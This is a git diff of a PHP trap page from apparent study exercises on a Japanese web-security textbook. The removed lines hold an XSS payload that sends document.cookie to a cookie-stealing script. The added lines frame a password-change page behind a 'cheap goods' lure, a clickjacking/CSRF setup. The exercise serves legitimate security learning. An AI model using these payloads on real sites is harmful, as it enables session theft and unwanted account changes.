@@ -1,15 +1,15 @@
 <?php
 /**
  *
- * 『表示処理に伴う問題』（安全なWebアプリケーションの作り方 p88~）
- * XSSによるクッキー値の盗み出し
+ *  * 『「重要な処理」の際に混入する脆弱性』（安全なWebアプリケーションの作り方 p141~）
+ * パスワード変更処理を題材にして
  *
  * *** 罠ページ（このページに飛んでる時点で罠は踏んでる） ***
  *
  * Created by IntelliJ IDEA.
  * User: xsmiledur
  * Date: 2017/06/12
- * Time: 15:44
+ * Time: 15:21
  */
 
 ?>
@@ -18,13 +18,13 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>罠ページその２</title>
+    <title>罠ページその１</title>
     <meta name="viewport" content="width=device-width">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 激安商品情報
-<iframe style="height: 400px; width: 1000px;" src="../search.php?keyword=<script type=text/javascript>window.location='trap/get-coockie.php?sid='%2Bdocument.cookie();</script>">
+<iframe src="pass-change.php" style="width: 1000px; height: 200px; /*display: none;">
 </iframe>
 <br>
 
